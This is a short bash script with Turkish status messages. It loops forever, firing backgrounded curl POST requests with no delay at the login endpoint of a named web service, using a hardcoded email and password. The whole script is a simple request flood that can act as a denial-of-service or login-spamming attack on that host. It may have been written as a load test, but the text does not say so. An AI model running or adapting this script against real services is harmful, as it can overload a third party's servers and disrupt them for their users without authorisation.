#!/bin/bash
i=0

trap ctrl_c INT

ctrl_c() {
    echo "Program kapatıldı."
    exit 0
}

while true
do
  curl --location --request POST 'https://app.tripy.mobi/api/auth/login-with-password?email=ahmet%40gmail.com&password=12345678&app=Postman&lat=39.939467218170364&lon=32.824049948033284' --header 'Accept: application/json' &
    echo "Paket $i:"
    i=$((i+1))
done

